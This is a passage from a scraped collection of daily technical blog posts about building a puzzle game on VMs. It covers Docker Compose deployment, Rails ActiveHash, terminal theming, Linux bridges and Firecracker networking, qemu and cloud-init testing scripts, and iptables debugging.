I guess there’s a symlink or something but I’m still a bit\nconfused about this qcow2 format. \n \n\n that’s all! \n\n Today I’m going to try to use my newfound qemu powers to automate testing my\ncloud-init files! \n\n"},
{"url": "https://jvns.ca/blog/2021/01/08/some-extra-daily-blog-posts/", "title": "Daily blog posts about my time at RC", "content": "\n      A quick note: I’ve been writing some daily-ish blog posts about what I’ve been\ndoing in my time at the Recurse Center, but I took them out of this RSS feed\nbecause I think they’re a bit more stream of consciousness than my usual posts.\nHere’s where to find them if you’re interested: \n\n \n You can find them all in the  Recurse Center 2020  category \n If you want to subscribe to my daily RC posts, here’s an  RSS link \n \n\n"},
{"url": "https://jvns.ca/blog/2021/01/07/day-32--a-rails-model-that-doesn-t-use-the-database-with-activehash/", "title": "Day 32: A Rails model that doesn't use the database with ActiveHash", "content": "\n     \n\n Hello! RC took a few weeks ago, and it’s back now! I’m batching these posts a\nfew days at a time, so here’s what happened on Tuesday. \n\n deployed docker-compose to production \n\n On Monday I set up a dev environment with Docker Compose ( blog\npost ), but I wasn’t sure if it would work well in production. \n\n My “production” in this case is a single DigitalOcean droplet, and I thought\nthat setting up a new server to use docker-compose instead of what I already\nhad would be a lot of work. \n\n It turned out to be easier than I thought and it only took a couple of hours\nand I felt like my new setup was WAY more robust afterwards. \n\n the steps to setting up docker-compose in production \n\n I think all of my steps were: \n\n \n use DigitalOcean’s one-click Docker droplet to start an instance \n install  net-tools  so that I could use netstat \n install  golang  so that I could build go programs outside the container (though I’ll probably switch to doing this in a container soon, it’ll be better) \n clone my Github repo to a bare repository on the droplet ( git clone https://github.com/my/repo --bare ) \n set up a post-receive hook (like in  this example ),  here’s my post-receive hook \n write a  docker-compose-prod.yml  (you can  see it here ) with a slightly different configuration for production \n Add my server as a remote, like  git remote add railsbox root@1.2.3.4:/my-repo.git \n run  git push railbox \n make a dump of my database with  pg_dump  and restore it in the new database \n copy some secrets that aren’t in git over to the server (SSH keys, the Rails secret master key, and some secret environment variables) \n fix a bunch of miscellaneous problems with my configuration files to make them actually work \n update my DNS records \n done! \n \n\n This is pretty far from “just click one thing and you’re done” but I feel like\nif I had to do it again because I lost my production server it wouldn’t be too\nbad. It’s definitely much better than “just create a lot of systemd files by\nhand” which is what I was doing before. \n\n making it easier for me to edit my puzzles \n\n All of this docker-compose stuff wasn’t actually my goal for the day, though! \n\n My real goal was: I have this sort of puzzle game, and I was storing the\ndefinitions for my puzzles (basically the title and a  cloud-init.yaml  file)\nin the database. \n\n This really wasn’t working for me because I needed to make a lot of updates to\nthe puzzles (at least to start) and having to do it through a web interface\nfelt way too slow. \n\n Andther problem I was having was that the puzzles tables wasn’t synced between\ndev and prod, which made it hard to test. \n\n enter ActiveHash! \n\n ActiveHash  is a Ruby gem that let you\njust define all of your data for a model in a hashmap or file instead of having\na database table. \n\n This feels good for now because I only have like 6 puzzles and so having them\nall in a file makes it way easier to edit them. \n\n The main thing that makes me feel nervous about it is that right now I’m\nentering the puzzle IDs manually (like  id: 1 ) and I need to make sure to not\naccidentally reuse/change the IDs. This is important because some other fields\nin the database reference the puzzle ID. \n\n my current Puzzle class \n\n Here’s what my Puzzle with ActiveHash looks like. It’s really simple. \n\n class Puzzle < ActiveHash::Base\n  def to_param\n    \"#{id}-#{slug}\"\n  end\n\n  def finished?(user)\n    PuzzleStatus.where(user_id: user.id).where(puzzle_id: self.id).first&.finished || false\n  end\n\n  def cloud_init\n    File.read(\"puzzles/#{group}/#{slug}/cloud-init.yaml\")\n  end\n\n  self.data = [\n    {\n      id: 1,\n      group: \"networking\",\n      slug: \"connection-timeout\",\n      title: \"The Case of the Connection Timeout\",\n      published: false,\n    },\n    ... more data here\n \n\n I can still use some ActiveRecord methods! \n\n Things like  belongs_to  and  has_many  don’t work (which kinda makes sense to\nme), but I can still do  Puzzle.find(id)  to find a puzzle by its ID, so I\ndidn’t have to change too much of my code. \n\n And because I’m using ActiveRecord methods, if I ever want to switch back to\nusing a database to manage them, it should be pretty easy! \n\n what I had to do to switch to this class \n\n I needed to: \n\n \n remove all of the edit/update/create code from my Puzzles controller \n write a migration to drop the  puzzles  table from the database \n remove the  puzzles.yml  fake data from my tests (because it was inserting that data into the database, which was failing) \n \n\n and probably some more things that I’ve forgotten \n\n that’s all! \n\n I felt pretty happy about both these changes. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/15/day-39--customizing-gotty-s-terminal/", "title": "Day 39: Customizing gotty's terminal", "content": "\n     \n\n Yesterday I spent some time customizing gotty’s terminal from its default white\non black. I couldn’t find any explanation on the internet of how to do this, so\nhere’s what I did. \n\n step 1: find one of Blink Shell’s themes \n\n I knew that gotty used HTerm, so I googled “HTerm themes” and found  this list of Blink Shell’s themes . \n\n Blink Shell is an open source iPad SSH app (which I actually use sometimes on\nmy iPad!). It works great, but the important point here is that they apparently\nuse HTerm as their terminal and so they have a bunch of HTerm themes on GitHub. \n\n For example, here’s the code for the Solarized theme: \n\n t.prefs_.set('color-palette-overrides',[\"#002831\", \"#d11c24\", \"#738a05\", \"#a57706\", \"#2176c7\", \"#c61c6f\", \"#259286\", \"#eae3cb\", \"#001e27\", \"#bd3613\", \"#475b62\", \"#536870\", \"#708284\", \"#5956ba\", \"#819090\", \"#fcf4dc\"]);\nt.prefs_.set('foreground-color', \"#536870\");\nt.prefs_.set('background-color', \"#fcf4dc\");\nt.prefs_.set('cursor-color', 'rgba(83,104,112,0.5)');\n \n\n step 2: integrate  it into gotty \n\n At first I tried just including that Javascript in my HTML file. But it said  t  was an undefined variable, so that didn’t work. \n\n So instead I modified  gotty.js  to add these 3 lines: \n\n if (setPrefs) { // julia: added this to set terminal colors\n    setPrefs(term)\n}\n \n\n and put the theme code inside a  setPrefs  function: \n\n function setPrefs(t) {\nt.prefs_.set('color-palette-overrides',[\"#002831\", \"#d11c24\", \"#738a05\", \"#a57706\", \"#2176c7\", \"#c61c6f\", \"#259286\", \"#eae3cb\", \"#001e27\", \"#bd3613\", \"#475b62\", \"#536870\", \"#708284\", \"#5956ba\", \"#819090\", \"#fcf4dc\"]);\nt.prefs_.set('foreground-color', \"#536870\");\nt.prefs_.set('background-color', \"#fcf4dc\");\nt.prefs_.set('cursor-color', 'rgba(83,104,112,0.5)');\n}\n \n\n here are the two files I used: \n\n \n https://gist.github.com/jvns/159d1e6415a756da634b298cbc6867e0#file-gotty-js-L22-L24 \n https://gist.github.com/jvns/b25bdfe7508b3d0782b800e5e4e80c47 \n \n\n it still doesn’t look as good as I’d like \n\n I’m not sure why, but even though the background color is right, it doesn’t look as good as the\nSolarized theme I have in my terminal on my laptop. \n\n Here’s my laptop’s terminal: \n\n \n\n and here’s the VM terminal via  gotty : \n\n \n\n I think some of the differences are because I’m using fish on my laptop and\nbash on the VM, but the gray directories really seem wrong to me. \n\n I’ve never really understand shell colors so maybe this will be the reason I finally learn. \n\n also started pushing images to github’s container registry \n\n I also improved my deployment a bit yesterday by pushing Docker images to a registry instead of building them on my server. \n\n This was important because the server is pretty slow, so it would use 100% of the CPU for like\n5 minutes on building the images when I deployed and make the server super slow. \n\n So now when I deploy, instead of running this on the server: \n\n docker-compose build; docker-compose up\n \n\n I run \n\n docker-compose pull; docker-compose up\n \n\n It’s way faster and also feels like it’s going to be more reliable. I\nalso wasted a bunch of hours trying to build the images in CI but in the end I\ndecided to just build them om my laptop because I couldn’t get Docker image caching to work with github actions. \n\n This took a long time like things like this always do but it was pretty boring\nso I don’t have much more to say about it. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/16/day-40--screen-flickering---a-talk-about-containers/", "title": "Day 40: screen flickering & a talk about containers", "content": "\n     \n\n On Friday I gave a talk about containers and worked a bit more on the puzzle\nwebsite design. I’m going to talk about something else though which is my\nattempt to understand what’s going on with laptop screen flickering. \n\n I still don’t know a lot about this so as usual it’s possible some things in\nhere are wrong. \n\n content warning: some flickery images ahead. \n\n why do I have a headache? (maybe PWM?) \n\n I’ve had a headache every day this week since I got a new laptop which has been\npretty unpleasant. This is a new thing and I mentioned this to Kamal and he\nsuggested “maybe your new screen is flickering”. \n\n I searched something like “thinkpad t14 headache”, and\nlearned about something called “pulse width modulation” or PWM that some people are\nsensitive to. Apparently the way some screens do screen dimming is to rapidly\nflicker the screen on/off. \n\n I thought a screen was called a screen but everyone on the internet talking\nabout laptop/TV screens seem to call them “panels” so I guess I’ll say “panel” for the rest of this post. \n\n the thinkpad panel lottery \n\n Another thing I learned which was surprising to me is that Lenovo won’t tell\nyou which exact monitor panel you get when you order a laptop from them. People\nseem to talk a lot about this on the internet because some the panels can be\npretty different from each other. \n\n This\n page from notebook check \ntalks about the panel lottery a bit. \n\n taking a video of my screen \n\n I read on the internet that you can diagnose flickering issues by taking a slow motion video of your screen so I took videos of 3 laptops: my old laptop (x250), my new laptop (t14s), and Kamal’s laptop (t14). \n\n here’s my old laptop (which didn’t cause me problems), with a LP125WF2-SPB2 panel. \n\n \n\n here’s the new laptop: (the suspected culprit), with a R140NWF5 RA panel. \n\n \n\n and here’s kamal’s laptop: (which doesn’t look like a video at all, but what’s happening is that there’s just no flickering). that’s a N140HCR-GL2. \n\n \n\n I find the results here kind of weird – both the videos of my old and new\nlaptops seem kind of intense and if the new one is causing me problems I don’t\nunderstand why the old one wouldn’t as well. But maybe the black bar going down\nthe screen on the old one is actually the screen refreshing and not PWM? I\ndon’t really know what to make of this. \n\n how to find out what panel you have \n\n I found out which panel I have (on Linux) by running: \n\n strings /sys/class/drm/card0-eDP-1/edid\n \n\n It output  R140NWF5 RA . I found some information about the R140NWF5 RA on\n this page from notebook check \nreviewing a different Thinkpad laptop with the same panel which says that this\npanel has a PWM frequency of about 980 hertz. \n\n That seems kind of high (900 times a second is fast!) and that site says “The\nfrequency of 980.4 Hz is quite high, so most users sensitive to PWM should not\nnotice any flickering.” So I’m still not quite sure if this is the reason I\nhave a headache. More experimentation required! \n\n not sure what I’ll do about this yet \n\n I might try to get the panel replaced with a different one (maybe the same one\nthat Kamal has) and see if it helps – it seems like they’re not that expensive\nto buy and there’s a computer shop nearby who I’ve had good experiences with\ngoing to for repairs in the past. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/19/day-41--trying-to-understand-what-a-bridge-is/", "title": "Day 41: Trying to understand what a bridge is", "content": "\n     \n\n Hello! Yesterday I spent a lot of time trying to understand what a bridge is so\nhere are my notes. I’m only going to talk about bridges as applied to\ncontainer / VM networking because that’s what I’m trying to do and also I’ve\nalso never seen a bridge used for anything else. \n\n Some things in this post are almost certainly wrong. \n\n why I’m doing this: trying to set up Firecracker networking \n\n I’ve been setting up some VMs using AWS Firecracker (which is amazing and lets\nyou start up VMs in like ONE SECOND, it’s extremely fast, and I will write\nabout it in the future because I really love it). Yesterday morning\nI was trying to configure the VM’s networking so that I could connect to the\noutside internet from inside the VM. I was googling how to do it and there were\nall these references to “make a bridge”, so I figured I needed to use a bridge. \n\n I’ve been avoiding understanding what a bridge is for years because it seemed\nconfusing, but I copied and pasted some things from Github issues / various\nblog posts and none of them did what I wanted. \n\n So I figured the “blindly copy and paste” approach wasn’t really going to work\nand decided OKAY TODAY IS THE DAY I WILL LEARN WHAT A BRIDGE IS. \n\n I’m going to use a bunch of Docker examples in this post even though I’m not\nplanning to use Docker because it’s already set up on my computer, it basically\ndoes what I want to do (but using a veth instead of a tap device), and I’m more familiar with it. \n\n some blog posts that helped me \n\n I asked on Twitter for help understanding Docker container networking and\npeople linked me to 2 really good blog posts that helped me: \n\n \n container networking is simple  is a\nvery clear explanation of how docker’s default container networking works\nwith great examples \n Tracing a packet journey using Linux tracepoints, perf and eBPF \nexplains how to use  perf trace  an eBPF. The perf trace example in\nparticular is super easy to use and it helped me feel more confident about\nwhat was going on \n \n\n a bridge is a layer 2 network interface \n\n One thing I learned is that a bridge is a layer 2 (ethernet) device that can\nhave an arbitrary number of network interfaces attached to it. \n\n My understanding of how it works is: \n\n \n You send a packet to the bridge \n If the bridge has a network interface attached to it with a MAC address\nmatching the destination MAC address on your packet, it sends it to that\nnetwork interface \n if there’s no matching interface or the packet is a broadcast packet (?)\nthen it sends it to all of the interfaces \n \n\n tap devices and veths are also layer 2 devices \n\n Docker uses veth pairs and the VM setup I’m using right now is using taps.\nThese are also both layer 2 network interfaces. So they just sort of send\npackets on blindly and something else is responsible for setting the correct\nMAC addresses on packets. \n\n your computer finds container MAC addresses with ARP \n\n One question I had was – if you’re sending a packet to a container and it\nneeds to have the right MAC address on it to make it through the bridge, how\ndoes it know what the right MAC address is? I think the answer is the same as\nin a physical network: ARP! \n\n So your computer sends an ARP request like “hey who’s 172.17.0.8” and the\ncontainer sends an ARP reply back like “it’s me! here’s my MAC address”. The\nbridge gets involved here because it needs to send the ARP request to the container and the ARP reply back to the host. \n\n I’m not 100% sure about this but I saw some ARP requests/replies being sent\nback and forth and it makes sense. I think this is really funny because – all\nof this information is on the same computer and it doesn’t feel like it should\nneed to use ARP to look up MAC addresses, like it has all the information\nalready! But I guess it just literally pretends like it’s a physical network. \n\n you need to set up the route table correctly \n\n I think the most important thing with bridges is to set up the route tables\ncorrectly. So far my understanding is that there are 2 route table entries you\nneed to set: \n\n route entry 1: on the host \n\n The first route entry that needs to be set is on the host, to make sure that\neverything on the bridge subnet gets sent to the bridge. Here’s what that looks\nlike in Docker’s default networking setup. \n\n 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 \n \n\n route entry 2: inside the container/VM \n\n In the container/VM, the system’s  gateway  needs to be set to the bridge \n\n For example, in a Docker container, you’ll see this: \n\n $ ip route list\ndefault via 172.17.0.1 dev eth0 \n172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2 \n \n\n This  default via 172.17.0.1 dev eth0   line means that all packets going\noutside the container subnet should be first sent to 172.17.0.1, which is the\n docker0  bridge (actually it’s a veth pair which leads to the docker0 bridge) \n\n you need an SNAT rule on the host \n\n The third thing I need if I want the containers to be able to talk to the wider\ninternet is an SNAT iptables rule on the host. Here’s what that looks like in Docker’s default setup. \n\n $ sudo iptables-save\n-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n \n\n now I can access the internet from my VM! \n\n I’m still not 100% on bridges but I  did  manage to configure a bridge so that\nwhen I ssh into my Firecracker VM I can access the internet! I am extremely delighted by this. \n\n Right now I’m reusing the  docker0  bridge which I’ll probably stop doing, but\nit does work. \n\n My understanding of all the steps to get a Docker-like setup where you can access a VM and it can access the outside internet are: \n\n \n create the VM network interface (either a  tap  device or a veth) ( ip tuntap add dev \"$TAP_DEV\" mode tap ) \n put the VM network interface behind the bridge ( sudo brctl addif docker0 $TAP_DEV ) \n bring up the VM network interface ( ip link set dev \"$TAP_DEV\" up ) \n set the VM’s gateway to be the bridge IP (via the kernel boot args, which I talk about below) \n setup the host’s route table to route packets on the bridge’s subnet to the bridge (I think I’d do this when creating the bridge, which I didn’t do in this case because I’m reusing the docker bridge) \n add an SNAT rule to the host to NAT packets coming out of the bridge (with  iptables ) \n Change  /etc/resolv.conf  to say  nameserver 8.8.8.8  because I don’t have a working local resolver inside the VM \n \n\n Here’s a snippet from my script that starts a firecracker VM. I modified it from the  firecracker-demo  code. \n\n I might post the whole thing later after I clean it up and stop using the docker bridge. \n\n CONTAINER_IP=172.17.0.33\nGATEWAY_IP=172.17.0.1\nDOCKER_MASK_LONG=255.255.255.0\nip tuntap add dev \"$TAP_DEV\" mode tap\nsudo brctl addif docker0 $TAP_DEV\nip link set dev \"$TAP_DEV\" up\n# I'm not sure what these two are for exactly\nsysctl -w net.ipv4.conf.${TAP_DEV}.proxy_arp=1 > /dev/null\nsysctl -w net.ipv6.conf.${TAP_DEV}.disable_ipv6=1 > /dev/null\n \n\n I also had to set  ip=${CONTAINER_IP}::${GATEWAY_IP}:${DOCKER_MASK_LONG}::eth0:off  in the kernel boot args. to set the VM’s gateway. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/20/day-42--writing-a-go-program-to-manage-firecracker-vms/", "title": "Day 42: Writing a Go program to manage Firecracker VMs", "content": "\n     \n\n Hello! On Tuesday I spent more time working on figuring out how to run VMs with\nFirecracker for my SSH game project. They still start super fast and I’m really\nexcited about them. \n\n I got through 3 main things: \n\n \n learned 1 new thing about how linux bridges work \n figured out how to make my Ubuntu VMs boot fast \n wrote a small Go server to manage Firecracker VMs \n \n\n a linux bridge isn’t just a bridge \n\n Every single time I say I’m confused about bridges someone will tell me “well,\nyou see julia, a bridge is like a virtual switch”. This has never made any sense to me\nbecause I’ve never used a switch either, and also I felt like there was just\nsomething off about that explanation and that it didn’t explain the behavior I\nwas seeing in a way I couldn’t articulate. \n\n I think I finally learned something concrete about why bridges are confusing\nthough! On Linux, when you create a bridge you get an network interface (like\n docker0  for the Docker bridge). And that network interface has an ip address,\nand you can use that network interface/ip address as a gateway for\ncontainers/VMs you’re running. \n\n But switches don’t have IP addresses! So if “a bridge is like a switch”, what’s\ngoing on? A bridge doesn’t really seems like it’s a switch! This analogy really\nseems to be breaking down. Someone on Twitter finally explained yesterday to me\nthat when you create a bridge on Linux by default, you actually get 2 things: \n\n \n a bridge (the kind that’s “like a switch”, that doesn’t have an ip address and just forwards packets blindly) \n a network interface with the same name as the bridge, which has an IP address that you can use as a gateway. \n \n\n They said that if you want, you can delete the network interface part of the\nbridge. I still haven’t experimented enough to work this out but I feel really\ngood about this piece of information and like I can use it to properly\nunderstand what a Linux bridge is later. \n\n Also I feel kind of vindicated in disbelieving this “a bridge is like a switch”\nexplanation because I guess it’s technically true but it’s definitely missing a\nkey piece of information for Linux bridges. \n\n fixed my Ubuntu VMs taking 2 minutes to boot \n\n My Ubuntu Firecracker VMs had been taking 2-3 minutes to boot. They were\nhanging on a systemd step called “Load/Save Random Seed”, which apparently has\nsomething to do with kernel entropy. \n\n I googled this and tried a lot of different things to fix it. Here are all the\nthings that I tried that did not work: \n\n \n add random.trust_cpu=on  to kernel boot args \n set SYSTEMD_RANDOM_SEED_CREDIT=true in systemd-random-seed.service \n set SYSTEMD_RANDOM_SEED_CREDIT=force in systemd-random-seed.service \n install & enable haveged \n install rng-tools \n systemctl disable systemd-random-seed (though this really SHOULD have worked, I think I did something wrong there) \n \n\n Finally I changed the timeout in the systemd-random-service file to 2 seconds,\nwhich worked! Now my VMs start fast. It’s extremely possible that I actually\nneed this entropy generation for some reason (maybe to give  sshd  enough\nentropy so that it can generate session keys securely?) but I’ll cross that\nbridge when I come to it. \n\n So now I can start an Ubuntu virtual machine in like 5 seconds! It’s really\namazing. It’s probably possible to bring the boot time a bit more but I’m happy\nwith that. \n\n wrote a Go program to manage Firecracker VMs \n\n So far I’ve been starting VMs with the DigitalOcean API. So I wanted to write\nmy own little API to create Firecracker VMs. It was pretty straightforward\nbecause I mostly just copied a bunch of code from this Firecracker command line\ntool called firectl:\n https://github.com/firecracker-microvm/firectl \n\n Here’s a gist with my (pretty messy) code so far:  firecracker-manager.go . \n\n what my API looks like so far \n\n It totally works! I can start a VM with: \n\n echo '{\n    \"root_image_path\":  \"/images/ubuntu.ext4\",\n    \"kernel_path\":    \"/images/vmlinux\"\n}' | http post http://localhost:8080/create\n \n\n and I can stop it with: \n\n echo '{\"id\": \"DE52E8A0-C624-18CB-F948-0B50C77C8F4A\"}'  | http post localhost:8080/delete\n \n\n It’s still missing some things, like: \n\n \n I should probably use the firecracker jailer for better security (like firectl does) \n right now I’m still writing the VM’s serial output to stdout \n I might make it REST-y and use a DELETE request to stop a VM \n \n\n and probably lots more things I’m not thinking of right now \n\n"},
{"url": "https://jvns.ca/blog/2021/01/09/day-35--launching-my-vms-more-reliably/", "title": "Day 35: Launching my VMs more reliably", "content": "\n     \n\n I’ve been having a problem for a while where my virtual machines (that I use to\nset up the puzzles) don’t launch reliably – sometimes they work, and sometimes\nthey don’t. \n\n I didn’t understand why this was before, and on Friday I think I figured it out! \n\n what was going wrong \n\n When I started a puzzle, I’d: \n\n \n launch a VM (by giving  cloud-init  a  cloud-init.yaml  file), which would set up all the right files and run some commands \n wait until SSH was up \n ssh into the VM and run a script called  setup/run.sh \n done! \n \n\n I don’t know why it took me so long to remember this, but – just because\n ssh  is running, it doesn’t mean that the  cloud-init  is done running! So if I\n ssh  into the instance as soon as SSH is up, my setup script might not have\neverything it needs to run. \n\n I also found  this launchpad bug \nsuggesting that at some point in the past cloud-init only brought up SSH when\nit was finished running, but that that doesn’t happen anymore. \n\n solution: wait until  cloud-init  is done running \n\n cloud-init  makes this pretty easy: it creates a file at  /var/lib/cloud/data/result.json  when it’s done running. \n\n I also made my puzzle setup code run as part of  cloud-init  (in the\n scripts/per-boot  stage), so I don’t need to do an extra SSH to run the last\nstage of setup. \n\n So now instead I’m doing: \n\n \n launch a VM (by giving  cloud-init  a  cloud-init.yaml  file) \n wait until SSH is up \n wait until the  result.json  file is present \n make sure that  cloud-init  succeeded \n done! \n \n\n I’m not sure that this will solve all my problems, but it’s helped already and it’s a much better plan. \n\n how to make SSH ignore  .ssh/known_hosts \n\n Right now I’m testing my  cloud-init.yaml  files by spinning up a bunch of VMs\non my laptop with  qemu . I had a problem where every instance had a different\nrandomly generated SSH key, so SSH was giving me these giant warnings about the\nkey for  ubuntu@localhost:2222  changing. These warnings were annoying me (and\nproviding no value in this case) so I wanted them to go away. \n\n At first I tried to solve this with  ssh -o StrictHostKeyChecking=no  but,\nwhile this let me SSH without typing “yes” to the prompt warning me about the\nchange in keys, it still displayed the warning. \n\n I found out that I can do  ssh -o UserKnownHostsFile=/dev/null  instead, which\nignores my usual  .ssh/known_hosts  file. \n\n a script to run my  cloud-init  files locally with qemu \n\n I also wrote a script to run my  cloud-init  files locally! \n\n Here it is. Now I can just run  ./scripts/start-vm PUZZLE-NAME  to start the VM\nfor a given puzzle. It takes about a minute to boot a VM and it made it WAY WAY\nWAY faster to iterate on changes. \n\n I’ve gotten a bit better at bash recently by writing the bash zine and I used\nsome of my newfound bash knowledge here (like using  trap  to kill the qemu\nprocess when the script exits,  writing while loops, and  $(())  for\narithmetic.). I felt like this was a nice example of a good place for a bash script because: \n\n \n the logic is very simple (there’s just 1 while loop and a  trap ) \n it needs to run a bunch of processes (so bash is the right language) \n I’m the only person using it \n \n\n #!/bin/bash\nset -e\n# kill qemu on exit\ntrap 'set -e; kill $(jobs -p)' exit\n\nCLOUD_INIT_FILE=$(find . -path \"*$1*cloud-init.yaml\")\n[ -f $CLOUD_INIT_FILE ] || exit\n\necho \"instance-id: $(uuidgen || echo i-abcdefg)\" > my-meta-data\n\nIMG=/tmp/my-seed.img\nFOCAL=/home/bork/work/images/focal-server-cloudimg-amd64.img\nSNAPSHOT=/tmp/snapshot.qcow2\nqemu-img create -b $FOCAL -f qcow2 -F qcow2 $SNAPSHOT\n\ncloud-localds $IMG $CLOUD_INIT_FILE my-meta-data\n\nqemu-system-x86_64 --enable-kvm -m 1024 \\\n    -drive file=$SNAPSHOT,format=qcow2 \\\n    -drive file=$IMG,format=raw \\\n    -net user,hostfwd=tcp::2222-:22 -net nic \\\n    -nographic > out 2>out &\n\nSSH_OPTIONS=\"-p 2222 -i wizard.key -o UserKnownHostsFile=/dev/null -o ConnectTimeout=1 -o StrictHostKeyChecking=no\"\n\nstart=$SECONDS\nwhile ! ssh $SSH_OPTIONS wizard@localhost 'python3 /usr/local/bin/started_up'\ndo\n    duration=$(( SECONDS - start ))\n    echo \"waiting for ssh.. $duration\"\n    sleep 1\ndone\n# we're done! SSH into the VM.\nssh $SSH_OPTIONS wizard@localhost\n \n\n next up: see if it’s actually more reliable! \n\n I’ve done a lot of testing locally and this setup seems more reliable, but I\nstill haven’t implemented it in production. My guess is that there are still a\nfew other problems I’ll need to work out. \n\n Booting a VM is also still pretty slow – it takes almost 2 minutes sometimes!\nKamal suggested using  kexec  and I still haven’t fully understood what that is\nor how I could use it. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/21/day-43--building-vm-images/", "title": "Day 43: Building VM images", "content": "\n     \n\n I spent all day yesterday trying to build Ubuntu VM images that work with\nFirecracker without too much success. \n\n some miscellaneous things I learned about manipulating images \n\n At some point I was trying to extract the filesystem from the Ubuntu cloud\nimage to use with Firecracker. This did not work \n\n \n I can use  sfdisk  to view the partition table of a disk image \n I can use  dd  to extract  dd if=focal-server-cloudimg-amd64.img.orig.raw of=focal-image.ext4 skip=227328 count=4384735 \n Some Linux files are “sparse” which means that regions which are filled with 0s are collapsed. Very useful for disk images. \n I can use  fallocate -d  to turn a non-sparse file into a sparse file \n \n\n compiling the linux kernel isn’t that slow \n\n The Firecracker instructions suggest building your own Linux kernel from\nsource. This seemed intimidating to me because I hadn’t done it before but it\nwas actually totally fine! \n\n It only took me like 5 minutes to compile a Linux kernel from scratch (with\n make -j12  on an AMD Ryzen 5). I was really surprised by this, I thought it\nwould take like 2 hours. \n\n I found out that the Linux kernel I compiled didn’t have the ISO filesystem\nsupport, so I needed to reconfigure it to include ISO filesystem support. This\nwas very easy. \n\n the Ubuntu docker image doesn’t seem like the best base for a VM image \n\n I’m still not sure what Ubuntu image I should use as a base for my VMs. I’ve\nbeen trying both the Ubuntu cloud image ( https://cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img )\nand the Docker Ubuntu:20.04 image \n\n Problems with the Ubuntu cloud image: I haven’t been able to get it to boot yet\nfor some reason I haven’t worked out. It gets stuck on this  A start job is running for /dev/disk/by-label/UEFI  step that  Idon’t understand. \n\n Problems with the Docker image: it does boot, but I haven’t managed to convince\n cloud-init  to successfully run in it yet. I also need to install a some basic\nthings in it (like  init  and  udev  for some reason), and it’s not really\ndesigned to be a system to log into so I feel like it’s missing a lot of things \n\n Maybe today I’ll go back to the cloud image and see what problems there are with getting it to boot. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/22/day-44--got-some-vms-to-start-in-firecracker/", "title": "Day 44: Building my VMs with Docker", "content": "\n     \n\n Another pretty short post today, still in Firecracker land. \n\n decided to build my VMs with Docker instead of cloud-init \n\n I’ve been trying to figure out how to build my VMs for a while. Previously my\nplan was to just run  cloud-init  when the VM started, because I already had\n cloud-init.yaml  files to launch VMs that I’d written previously. \n\n It turned out that for some reason I couldn’t get  cloud-init  to start, and\nalso it felt like  cloud-init  was going to be really slow to run – even when\nit was failing, it was already taking more than 10 seconds. I really wanted the\nVM to boot in less than 2 seconds. \n\n So I decided to instead build my containers with Docker, convert the Docker\nfilesystem to an ext4 image, and then start that image in Firecracker. Here’s\nwhat creating the image looks like in a bash script. \n\n IMG_ID=$(docker build -q .)\nCONTAINER_ID=$(docker run -td $IMG_ID /bin/bash)\nMOUNTDIR=mnt\nIMAGE=ubuntu.ext4\nmount $IMAGE $MOUNTDIR\nqemu-img create -f raw $IMAGE 800M\nmkfs.ext4 $IMAGE\ndocker cp $CONTAINER_ID:/ $MOUNTDIR\n \n\n It seems to work fine, and actually building my VMs with Docker feels a lot\nsimpler than doing it with  cloud-init.yaml , I think they might be easier to\ndevelop this way. \n\n setting up Docker-Compose’s bridges \n\n I kind of want to run my VM management software with  docker-compose , but it\nneeds to make changes to the host network to set up the bridges / tap\ninterfaces. \n\n I learned that Docker Compose by default creates a new bridge for every\n docker-compose  file with a random name.  I didn’t think this was going to\nwork for me, because I want to put my VMs on the same bridge as the  gotty \ncontainer that needs to SSH into the VMs. So I needed to know the name of the\nVM. \n\n It turns out the Docker Compose is AMAZING and lets you explicitly set the name of the bridge for a network \n\n So I set up a network in my  docker-compose.yml  file that looks like this, and\nput my  gotty  container in the  firenet  network. \n\n version: \"3.3\"\nnetworks:\n  firenet:\n    driver: bridge\n    ipam:\n     driver: default\n     config:\n       - subnet: 172.101.0.0/16\n    driver_opts:\n      com.docker.network.bridge.name: firecracker0\n \n\n I still haven’t tested this out because there are some other legos I need to\nput together, but I think it should work. \n\n trying out fly.io \n\n I got a bit frustrated with writing my own Firecracker VM service so later in the day, so I\nasked on Twitter if anyone knew of a cloud service where I could run a\nFirecracker VM. I was pretty sure the answer was no, but I’m happy I asked\nbecause I was wrong! \n\n It turns out that  https://fly.io  supports a Docker container interface, but they\nactually just unpack the Docker container’s files, convert it into an ext4\nfilesystem, and boot a Firecracker VM with it. They don’t support you picking\nthe init system or choosing a kernel and presumably the VMs are kind of locked\ndown, but it’s not a container! \n\n I’d initially assumed it was a container because Fargate and Kata Containers\nboth run containers images in VMs by putting a container runtime inside the\nFirecracker VM and running the container that way. \n\n I got some VMs to run on fly.io using their Go API after a few hours, so we’ll\nsee how that goes! I’ll do a few more experiments today. It was pretty\nstraightforward except that their API isn’t documented yet. But their command\nline management tool is open source so I could just read the source for\n flyctl  to figure out how it worked. \n\n"},
{"url": "https://jvns.ca/blog/2021/01/26/day-46--debugging-an-iptables-problem/", "title": "Day 46: debugging an iptables problem", "content": "\n     \n\n I spent a lot of my brain energy yesterday debugging an iptables mystery. \n\n the iptables mystery \n\n I needed to be able to ping the host’s IP (like  192.168.1.23 ) from inside a\ncontainer. This was working 100% totally fine on my laptop. Then I tried the\nexact same thing on my server, and it didn’t work at all! \n\n At first I thought that maybe I didn’t understand something about how bridges\nwork, and I spent some time reading about bridges. I think I learned a tiny bit\nmore about bridges but this didn’t really help. \n\n Then Kamal said “well, maybe it’s iptables” and so I spent some time looking\ninto that. I really didn’t think it was iptables because I didn’t think there\nwere any special iptables rules except the Docker rules, and the Docker rules\nwere working fine on my laptop. \n\n some adventures in iptables tracing \n\n I tried to trace some specific iptables rules that I thought might potentially\nbe the problem (with  -j TRACE ) following this very good blog post  How do I see what iptables is doing?  \n\n This ultimately didn’t really help, but at some point that blog post suggested\nrunning  iptables -L -n -v --line-numbers  and I noticed something!!! \n\n what was happening: iptables was dropping some packets \n\n When I ran  iptables -L -n -v  and I saw something like this: \n\n $ iptables -L -n -v \nChain INPUT (policy DROP 2 packets, 120 bytes)\n pkts bytes target     prot 